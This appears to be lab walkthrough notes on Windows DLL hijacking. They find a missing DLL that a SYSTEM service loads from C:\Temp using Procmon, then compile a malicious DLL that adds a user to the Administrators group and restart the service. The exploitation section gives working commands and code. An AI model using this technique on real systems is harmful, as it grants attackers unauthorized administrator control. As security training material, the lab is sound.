
---
### 🧠 **What Is DLL Hijacking?**

DLL Hijacking occurs when:

- A program or service tries to load a **DLL from a writable location** (e.g., `C:\Temp`) **before** checking system folders.
    
- If the DLL is **missing**, and the user can **write to that location**, they can drop a **malicious DLL** that gets loaded with **the program’s privileges** (often SYSTEM or admin).
    

---

### 🔍 **Detection with Process Monitor**

1. Launch **Procmon** as Administrator.
    
2. Set filter:
    
    - `Process Name is dllhijackservice.exe`
        
    - `Result is NAME NOT FOUND`
        
3. Start the vulnerable service:
    
    ```cmd
    sc start dllsvc
    ```
    
4. In Procmon, observe:
    
    - `C:\Temp\hijackme.dll` is requested but **not found**.
        
    - Since `C:\Temp` is writable, this is a hijack opportunity.
        

---

### 💥 **Exploitation**

#### **On Kali VM**:

1. Modify the `windows_dll.c` source:
    
    ```c
    system("cmd.exe /k net localgroup administrators user /add");
    ```
    
    > This will add the current user to the **Administrators** group when the DLL is loaded.
    
2. Compile it into a DLL:
    
    ```bash
    x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
    ```
    
3. Transfer `hijackme.dll` to the Windows VM (e.g., via SMB or RDP).
    

---

#### **On Windows VM**:

1. Place the DLL:
    
    ```cmd
    move hijackme.dll C:\Temp\
    ```
    
2. Restart the service:
    
    ```cmd
    sc stop dllsvc & sc start dllsvc
    ```
    
3. Verify privilege escalation:
    
    ```cmd
    net localgroup administrators
    ```
    
    - You should now see the `user` account added to the **Administrators group**.
        

---

### ✅ **Why This Works**

- The service runs as **SYSTEM**, and tries to load a missing DLL from a **user-writable directory**.
    
- By placing a malicious DLL there, you're able to **execute code as SYSTEM**, gaining **privilege escalation**.
    

---
